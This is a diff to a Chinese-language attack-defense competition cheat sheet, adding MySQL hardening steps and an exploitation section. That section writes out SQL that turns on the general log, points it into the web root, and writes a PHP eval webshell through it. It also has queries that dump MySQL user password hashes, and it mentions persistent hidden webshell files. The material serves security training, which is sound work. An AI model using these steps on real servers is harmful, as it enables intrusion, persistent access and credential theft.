@@ -273,6 +273,35 @@ mysqldump –all -databases > all.sql
 mysql –u username –p password database < from.sql
 ```
 
+对于MySQL的攻防，可以看这篇文章：[https://blog.zgsec.cn/archives/26.html](https://blog.zgsec.cn/archives/26.html)
+
+MySQL默认配置文件路径：
+
+```
+C:\ Program Files\MySQL\MySQLServer 5.1\my.ini   //Windows
+/etc/my.cnf                                      //Linux
+/etc/mysql/my.cnf                                //Linux
+```
+
+修改 `secure_file_priv` 参数（日志功能的对应目录）
+
+```mysql
+secure_file_priv=""
+```
+
+重载MySQL配置
+
+```mysql
+FLUSH PRIVILEGES
+```
+
+重启MySQL服务
+
+```c
+sudo service mysql restart
+sudo systemctl restart mysql
+```
+
 #### 2.3.2 Mssql加固
 
 1. 删除不必要的账号	
@@ -620,7 +649,47 @@ while (1){
 ?>
 ```
 
-浏览器访问yj.php，会生成不死马.login.php /admin/.register.php
+浏览器访问 `yj.php`，会生成不死马 `.login.php` 和 `/admin/.register.php`
+
+#### 3.2.7 MySQL数据库利用
+
+具体可以看这篇文章：[https://blog.zgsec.cn/archives/26.html](https://blog.zgsec.cn/archives/26.html)
+
+1、查看MySQL版本
+
+```mysql
+show variables like '%version%';
+select version();      #这个只显示MySQL版本号
+```
+
+2、查看 `load_file()` 开启状态
+
+```mysql
+show variables like '%secure%';       #这条可查看详细信息
+show global variables like '%secure_file_priv%';
+```
+
+3、查看日志功能是否开启和对应目录
+
+```mysql
+SHOW VARIABLES LIKE 'general%';
+set global general_log = "ON";
+set global general_log_file='/var/www/html/test.php';   #可以写入WebShell然后直接连接蚁剑
+
+# 往日志里面写入 WebShell
+select '<?php @eval($_POST['AabyssTeam']);?>';
+# 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现
+```
+
+小技巧：获取MySQL账户和对应密码Hash
+
+```mysql
+# MySQL <= 5.6 版本
+select host, user, password from mysql.user;
+
+# MySQL >= 5.7 版本
+select host,user,authentication_string from mysql.user;
+```
 
 ### 3.3# 内网渗透
 
